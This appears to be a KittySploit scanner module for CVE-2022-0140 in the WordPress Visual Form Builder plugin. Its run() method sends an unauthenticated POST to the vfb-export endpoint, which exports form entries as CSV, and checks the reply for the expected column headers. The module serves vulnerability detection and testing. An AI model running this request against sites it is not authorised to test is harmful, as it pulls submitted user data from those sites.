#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Visual Form Builder plugin before 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Visual Form Builder <3.0.8 - Information Disclosure Detection',
        'description': 'WordPress Visual Form Builder plugin before 3.0.8 contains a information disclosure vulnerability. The plugin does not perform access control on entry form export, allowing an unauthenticated user to export the form entries as CSV files using the vfb-export endpoint.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'wpscan', 'disclosure', 'wordpress', 'vfbpro', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/9fa2b3b6-2fe3-40f0-8f71-371dd58fe336',
            'https://www.fortiguard.com/zeroday/FG-VD-21-082',
            'https://nvd.nist.gov/vuln/detail/cve-2022-0140',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2022-0140',
    }

    def run(self):
        path = '/wp-admin/admin.php?page=vfb-export'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Referer': '{{RootURL}}/wp-admin/admin.php?page=vfb-export', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': '{{RootURL}}'}, data='vfb-content=entries&format=csv&entries_form_id=1&entries_start_date=0&entries_end_date=0&submit=Download+Export+File\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('"Date Submitted"', '"Entries ID"',)
        if all(m in body for m in body_all):
            self.set_info(severity='medium', reason='WordPress Visual Form Builder <3.0.8 - Information Disclosure detected', path=path)
            return True
        return False

